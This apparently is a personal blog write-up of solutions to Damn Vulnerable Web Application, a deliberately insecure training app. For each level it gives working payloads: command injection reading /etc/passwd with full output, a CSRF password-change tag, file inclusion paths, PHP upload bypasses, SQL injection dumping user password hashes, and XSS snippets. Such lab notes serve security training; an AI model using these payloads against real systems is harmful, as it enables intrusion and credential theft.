+++
title = "Damn vulnerable-web-app"
slug = "damn-vulnerable-web-app"
default_language = "en"
[taxonomies]
categories=["vulnerable-web-app"]
tags=["web"]
+++

#Brute force

Low:

Running burp intruder with admin as pass and default password wordlist as a payload

Medium:


High:

Running burp intruder and grepping for csrf tokens and default password list as a payload, pitch fork for targeting

#Command Injection

Low:

Right off the bat, passing: ; cat /etc/passwd

{% highlight bash %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
{% endhighlight %}

Medium:

{% highlight bash %}
| cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
{% endhighlight %}

High:

{% highlight bash %}
| cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
{% endhighlight %}

#CSRF

Low: 

{% highlight html %}
<html><head><title></title></head><body><img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=password&password_conf=password" /></body></html>
{% endhighlight %}

Medium:

High:

#File Inclusion

Low:

{% highlight bash %}
http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
{% endhighlight %}

Medium:

{% highlight bash %}
http://127.0.0.1/vulnerabilities/fi/?page=file:///etc/hosts
{% endhighlight %}

High:

Upload a file matching: file[0-9].php and hit it: http://127.0.0.1/vulnerabilities/fi/?page=file4.php

#File Upload

Low:

Upload a php file

Medium:

Upload a php file and set its mime type to image/jpeg

High:

#CAPTCHA

Didn't seem to work at all out of the box

Low:

Medium:

High:


#SQLi

Low:

{% highlight sql %}
1' or 1 = 1
{% endhighlight %}

Medium:

{% highlight sql %}
id=3 or 1 = 1&Submit=Submit intercepting with burp
{% endhighlight %}

High:

{% highlight sql %}
ID: 1' or 1 = 1 union select user,password from users  #
{% endhighlight %}

ID: 1' or 1 = 1 union select user,password from users  #

First name: admin
Surname: admin

ID: 1' or 1 = 1 union select user,password from users  #
First name: Gordon
Surname: Brown

ID: 1' or 1 = 1 union select user,password from users  #
First name: Hack
Surname: Me

ID: 1' or 1 = 1 union select user,password from users  #
First name: Pablo
Surname: Picasso

ID: 1' or 1 = 1 union select user,password from users  #
First name: Bob
Surname: Smith

ID: 1' or 1 = 1 union select user,password from users  #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' or 1 = 1 union select user,password from users  #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' or 1 = 1 union select user,password from users  #
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' or 1 = 1 union select user,password from users  #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' or 1 = 1 union select user,password from users  #
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99


#SQLi Blind

Low:

{% highlight sql %}
2' and 'a' = 'a
{% endhighlight %}

Medium:

{% highlight sql %}
id=1 and 1 != 2 &Submit=Submit in burp
{% endhighlight %}

High:

{% highlight sql %}
1' and '' = '
{% endhighlight %}


#XSS Reflected

Low:

<script>alert(1)</script>

Medium:

<svg onload="alert(1)">

High:

<a href="#" onmouseover="alert(1)">adf</a>

#XSS Stored

Low:

Message: 

{% highlight bash %}
<script>alert(1)</script>
{% endhighlight %}

Medium:

Message: 
{% highlight html %}
<svg onload="alert(1)">
{% endhighlight %}

High:

Message: 
{% highlight html %}
<a href="#" onmouseover="alert(1)">adf</a>
{% endhighlight %}
